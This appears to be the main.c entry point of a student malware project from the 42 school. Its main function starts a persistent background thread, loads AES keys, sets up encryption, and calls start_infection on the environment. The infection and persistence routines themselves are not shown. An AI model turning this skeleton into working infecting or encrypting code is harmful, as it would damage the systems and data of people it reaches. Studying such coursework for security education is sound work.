/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/03/20 17:18:39 by frmarinh          #+#    #+#             */
/*   Updated: 2018/03/23 06:50:45 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

int			main(int argc, char **argv, char **env)
{
	t_aes			*aes = NULL;
	t_pers_thread	pers;

	pers.env = env;
	pers.running = TRUE;
	build_persistent_process_thread((t_pers_thread*)&pers);
	if ((aes = load_aes()) != NULL) {
		if (get_key_iv(aes) != NULL && init_encryption(aes)
		 && init_decryption(aes))
		{
			t_cipher_plain *cipher_plain = get_cipher_plain();
			 if (cipher_plain) {
				if (safe_mode(aes)) {
					 start_infection(aes, cipher_plain, env);
			 	}
			}
		}
	}
	pers.running = FALSE;
	free_aes(aes);
}
